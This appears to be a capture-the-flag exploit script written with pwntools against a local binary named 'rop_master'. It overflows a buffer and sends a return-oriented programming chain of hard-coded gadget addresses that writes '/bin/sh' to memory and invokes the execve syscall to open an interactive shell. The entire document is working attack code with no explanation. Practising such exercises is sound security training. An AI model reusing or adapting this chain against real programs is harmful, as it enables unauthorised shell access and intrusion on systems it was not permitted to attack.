from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

buf = 0x4c3000

# 0x0000000000445b9f : mov qword ptr [rdi], rsi ; ret
gadget = 0x0000000000445b9f
pop_rax_ret = 0x00000000004490d7
pop_rdi_ret = 0x0000000000401862
pop_rsi_ret = 0x000000000040f17e
pop_rdx_ret = 0x000000000040176f
syscall = 0x00000000004012d3

r = process('./rop_master')

r.sendline(b'a' * 0x18 + flat(
    pop_rsi_ret, b'/bin/sh\x00', 
    pop_rdi_ret, buf, 
    gadget, 
    pop_rax_ret, 0x3b, 
    pop_rsi_ret, 0, 
    pop_rdx_ret, 0, 
    syscall
))

r.interactive()
